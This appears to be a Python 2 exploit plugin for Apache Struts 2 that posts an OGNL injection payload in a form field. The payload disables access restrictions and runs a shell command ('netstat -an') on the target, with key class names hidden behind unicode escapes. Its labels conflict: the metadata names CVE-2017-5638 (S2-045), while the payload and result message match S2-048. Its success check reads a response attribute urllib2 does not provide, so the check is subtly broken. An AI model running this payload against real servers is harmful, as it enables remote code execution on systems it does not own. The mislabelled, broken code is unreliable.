#! /usr/bin/env python
# encoding:utf-8
import sys,urllib2,urllib

author = ""
scope = "Struts 2.3.5 - Struts 2.3.31, Struts 2.5 - Struts 2.5.10"
description = "struts2_045"
reference = "cve-2017-5638"
options = [
    {
        "Name": "URL",
        "Current Setting": "",
        "Required": True,
        "Description": "网站地址"
    }
]
def exploit(URL):
    data = {
        'name': "${(#dm=@\u006Fgnl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess=#dm).(#ef='netstat -an').(#iswin=(@\u006Aava.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#efe=(#iswin?{'cmd.exe','/c',#ef}:{'/bin/bash','-c',#ef})).(#p=new \u006Aava.lang.ProcessBuilder(#efe)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}",
        'age': 'bbb', '__checkbox_bustedBefore': 'true', 'description': 'ccc'}
    req = urllib2.Request(URL)
    data = urllib.urlencode(data)
    opener = urllib2.build_opener(urllib2.HTTPCookieProcessor())
    response = opener.open(req, data)
    try:
        if "0.0.0.0" in response.content:
            return "s2-048  存在利用"
    except:
        return None
    return None

